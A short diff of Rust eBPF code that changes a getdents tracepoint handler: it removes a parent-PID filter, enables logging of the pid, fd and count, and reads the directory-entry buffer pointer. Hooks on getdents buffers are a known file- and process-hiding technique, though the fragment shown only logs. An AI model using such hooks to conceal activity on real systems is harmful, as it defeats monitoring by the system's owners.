@@ -49,19 +49,19 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
                 .unwrap()
         };
 
-        if ppid != trarget_ppid {
-            return Ok(0);
-        }
+        // if ppid != trarget_ppid {
+        //     return Ok(0);
+        // }
     }
 
 
-    // let pid = pid_tgid >> 32;
+    let pid = pid_tgid >> 32;
     // field:unsigned int fd;  offset:16;      size:8; signed:0;
     // field:struct linux_dirent64 * dirent;   offset:24;      size:8; signed:0;
     // field:unsigned int count;       offset:32;      size:8; signed:0;
-    // let fd: u32 = unsafe { ctx.read_at(16).unwrap() };
-    // let buff_count: u32 = unsafe { ctx.read_at(32).unwrap() };
-    // info!(&ctx, "pid is {}, fd is {}, buff_count is {}", pid, fd, buff_count);
+    let fd: u32 = unsafe { ctx.read_at(16).unwrap() };
+    let buff_count: u32 = unsafe { ctx.read_at(32).unwrap() };
+    info!(&ctx, "pid is {}, fd is {}, buff_count is 0x{:x}", pid, fd, buff_count);
 
 
     let dirp: *const linux_dirent64 = unsafe { ctx.read_at(24).unwrap() };
